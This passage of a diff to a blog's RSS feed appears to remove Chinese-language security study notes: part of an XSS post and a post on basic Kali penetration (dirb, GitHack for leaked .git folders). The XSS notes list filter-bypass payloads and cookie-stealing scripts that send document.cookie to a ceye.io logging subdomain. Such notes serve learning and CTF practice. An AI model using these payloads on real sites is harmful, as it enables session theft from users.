-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?src=&amp;#x27;level1.php?name=&amp;lt;img src=1 onerror=alert(1)&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;格被编码为实体字符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#格被编码为实体字符&#34;&gt;#&lt;/a&gt; 格被编码为实体字符&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;空格用 %0a 替代&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img%0asrc=1%0aonerror=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a%0Aonclick=&amp;#x27;alert(1)&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;获取cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取cookie&#34;&gt;#&lt;/a&gt; 获取 cookie&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;获得管理员cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获得管理员cookie&#34;&gt;#&lt;/a&gt; 获得管理员 cookie&lt;/h2&gt;
-&lt;p&gt;临时域名网站：&lt;a href=&#34;http://ceye.io/profile&#34;&gt;http://ceye.io/profile&lt;/a&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var img=document.createElement(&amp;quot;img&amp;quot;); img.src=&amp;quot;http://q6d5hx.ceye.io/&amp;quot;+document.cookie;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!--这里gvipx6.ceye.io是上述网址产生的临时域名--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;过滤了 script&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body onload=&amp;quot;window.open(&amp;#x27;http://q6d5hx.ceye.io/&amp;#x27;+document.cookie)&amp;quot;&amp;gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;过滤了空格（用 /**/ 或 / 替换）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body/οnlοad=&amp;quot;window.open(&amp;#x27;http://q6d5hx.ceye.io/&amp;#x27;+document.cookie)&amp;quot;&amp;gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">https://starofeden.github.io/2023/08/24/CSRF/</guid>
             <title>CSRF(跨站请求伪造)</title>
             <link>https://starofeden.github.io/2023/08/24/CSRF/</link>
@@ -1250,36 +1464,6 @@ zsteg 1.png&lt;/li&gt;
 &lt;li&gt;过滤 post 请求（登录密码都是 post 提交）&lt;/li&gt;
 &lt;/ul&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http.request.method==&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://starofeden.github.io/2023/07/20/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84kali%E6%B8%97%E9%80%8F/</guid>
-            <title>从0开始的kali渗透</title>
-            <link>https://starofeden.github.io/2023/07/20/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84kali%E6%B8%97%E9%80%8F/</link>
-            <category>kali</category>
-            <category>web漏洞</category>
-            <pubDate>Thu, 20 Jul 2023 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;从0开始的kali渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从0开始的kali渗透&#34;&gt;#&lt;/a&gt; 从 0 开始的 kali 渗透&lt;/h1&gt;
-&lt;h2 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h2&gt;
-&lt;p&gt;dirb &lt;a href=&#34;http://xxxxx&#34;&gt;http://xxxxx&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;从网络上下载文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从网络上下载文件&#34;&gt;#&lt;/a&gt; 从网络上下载文件&lt;/h2&gt;
-&lt;p&gt;wget -r (-r 表示递归下载)&lt;/p&gt;
-&lt;h2 id=&#34;git&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git&#34;&gt;#&lt;/a&gt; git&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;.git 是一个隐藏文件夹，它是 Git 版本控制系统用来保存项目的版本历史和相关元数据的目录。&lt;/li&gt;
-&lt;li&gt;git reflog: 显示可引用的历史 flag 记录&lt;/li&gt;
-&lt;li&gt;git show 文件名：查看内容&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;githack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#githack&#34;&gt;#&lt;/a&gt; githack&lt;/h2&gt;
-&lt;p&gt;(在 win 上用，不知为啥 kali 上用会出错)&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;发现有 git 泄露后，克隆文件&lt;br&gt;
- python &lt;a href=&#34;http://GitHack.py&#34;&gt;GitHack.py&lt;/a&gt; &lt;a href=&#34;http://www.example.com/.git/&#34;&gt;http://www.example.com/.git/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;git log: 查看历史命令&lt;/li&gt;
-&lt;li&gt;git reset 切换版本&lt;/li&gt;
-&lt;li&gt;git diff 对比两次提交，查看两次差异&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git diff -- 文件名1 文件名2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
  ]]></description>
         </item>
         <item>
